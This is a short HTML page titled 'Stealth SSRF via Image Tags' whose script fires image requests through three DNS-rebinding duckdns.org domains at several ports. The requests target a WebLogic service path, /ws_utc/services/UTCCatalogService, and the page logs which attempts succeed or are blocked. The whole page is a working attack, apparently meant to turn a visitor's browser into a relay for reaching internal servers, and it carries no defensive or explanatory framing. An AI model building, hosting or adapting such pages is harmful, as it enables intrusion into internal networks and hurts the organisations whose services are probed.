<!DOCTYPE html>
<html>
<head><title>SSRF Relay</title></head>
<body>
  <h1>Stealth SSRF via Image Tags</h1>
  <pre id="log"></pre>
  <script>
    const rebinderDomains = [
      'ssrf1.duckdns.org',
      'ssrf2.duckdns.org',
      'ssrf3.duckdns.org'
    ];
    const ports = [7001, 7002, 8001, 8003, 9001];
    const path = '/ws_utc/services/UTCCatalogService';
    const log = document.getElementById("log");

    for (const rebinder of rebinderDomains) {
      for (const port of ports) {
        const url = `http://${rebinder}:${port}${path}`;
        const img = new Image();
        img.src = url;
        img.onload = () => {
          log.innerText += `✅ SSRF Triggered: ${url}\n`;
        };
        img.onerror = () => {
          log.innerText += `❌ SSRF Blocked: ${url}\n`;
        };
        document.body.appendChild(img);
      }
    }
  </script>
</body>
</html>
